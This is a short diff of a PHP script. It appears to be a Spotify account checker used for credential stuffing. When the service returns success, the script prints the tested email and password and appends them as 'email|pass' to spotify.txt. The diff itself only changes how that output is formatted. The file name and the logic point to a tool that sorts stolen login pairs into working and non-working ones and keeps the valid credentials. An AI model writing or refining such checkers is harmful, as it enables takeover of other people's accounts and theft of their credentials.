@@ -47,7 +47,7 @@ if ($json->status == "20") {
 }else {
 	if ($json->status == 1) {
 		$date = date("D-M-Y h:i:s");
-		echo "[-] Success \nEmail: $email \nPass: $pass \n";
+		echo "[=] Success \n    [-]Email: $email \n    [-]Pass: $pass \n";
 		fwrite(fopen("spotify.txt", "a"), "$email|$pass\n");
 	}
 }
